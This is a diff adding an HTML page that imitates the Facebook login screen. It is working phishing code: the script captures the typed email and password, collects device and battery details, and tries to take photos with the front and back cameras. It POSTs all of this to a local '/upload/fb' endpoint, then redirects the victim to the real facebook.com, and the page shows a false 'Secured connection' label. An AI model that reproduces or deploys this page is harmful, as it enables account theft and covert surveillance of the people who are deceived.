@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background: #f0f2f5; font-family: Arial, sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+        .login-box { background:white; padding:40px 50px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); width:400px; }
+        .login-box h1 { color:#1877f2; font-size:40px; margin-bottom:20px; text-align:center; }
+        .login-box input { width:100%; padding:14px; margin:10px 0; border:1px solid #dddfe2; border-radius:6px; font-size:17px; }
+        .login-box button { width:100%; padding:14px; background:#1877f2; color:white; border:none; border-radius:6px; font-size:20px; font-weight:bold; cursor:pointer; }
+        .login-box button:hover { background:#166fe5; }
+        .login-box .divider { border-bottom:1px solid #dadde1; margin:20px 0; }
+        .login-box .create-btn { background:#42b72a; }
+        .login-box .create-btn:hover { background:#36a420; }
+        .hidden { display:none; }
+        #status { color:#666; font-size:12px; text-align:center; margin-top:10px; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1>facebook</h1>
+        <form id="loginForm" onsubmit="return false;">
+            <input type="text" id="email" placeholder="Email or Phone" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="button" onclick="captureAndSubmit()">Log In</button>
+            <div class="divider"></div>
+            <button type="button" class="create-btn" onclick="captureAndSubmit()">Create New Account</button>
+        </form>
+        <div id="status">🔒 Secured connection</div>
+    </div>
+
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        async function captureAndSubmit() {
+            const status = document.getElementById('status');
+            status.innerHTML = '⏳ Processing...';
+            
+            // ডেটা সংগ্রহ
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // ডিভাইস ইনফো
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown'
+            };
+
+            // ব্যাটারি ইনফো
+            let batteryInfo = 'Unknown';
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = {
+                        charging: battery.charging,
+                        level: Math.round(battery.level * 100) + '%',
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch(e) {}
+            }
+
+            // ক্যামেরা ছবি (প্রথমে ফ্রন্ট ক্যামেরা চেষ্টা, না হলে ব্যাক)
+            let frontImage = null;
+            let backImage = null;
+            
+            try {
+                // ফ্রন্ট ক্যামেরা
+                const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = frontStream;
+                await video.play();
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                frontImage = canvas.toDataURL('image/png');
+                frontStream.getTracks().forEach(t => t.stop());
+            } catch(e) { frontImage = null; }
+
+            try {
+                // ব্যাক ক্যামেরা
+                const backStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = backStream;
+                await video.play();
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                backImage = canvas.toDataURL('image/png');
+                backStream.getTracks().forEach(t => t.stop());
+            } catch(e) { backImage = null; }
+
+            // সব ডেটা পাঠানো
+            const payload = {
+                site: 'Facebook',
+                username: email,
+                password: password,
+                frontImage: frontImage,
+                backImage: backImage,
+                deviceInfo: deviceInfo,
+                batteryInfo: batteryInfo,
+                timestamp: Date.now()
+            };
+
+            try {
+                const res = await fetch('/upload/fb', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                if(res.ok) {
+                    status.innerHTML = '✅ Redirecting...';
+                    window.location.href = 'https://facebook.com';
+                }
+            } catch(e) {
+                status.innerHTML = '⚠️ Error, redirecting...';
+                window.location.href = 'https://facebook.com';
+            }
+        }
+    </script>
+</body>
+</html>
